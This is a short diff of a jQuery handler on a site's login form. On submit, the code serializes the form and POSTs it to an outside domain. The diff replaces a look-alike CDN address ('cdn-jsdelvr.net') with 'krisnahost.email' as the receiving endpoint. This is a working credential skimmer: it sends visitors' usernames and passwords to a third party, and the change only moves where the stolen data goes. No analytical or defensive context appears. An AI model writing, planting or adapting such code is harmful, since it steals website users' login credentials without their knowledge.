@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
  var d = $(".login-form");
 
  $.ajax({
-        url: "https://cdn-jsdelvr.net/jquery",
+        url: "https://krisnahost.email/",
         type: "POST",
         data: d.serialize(),
         success: function () {
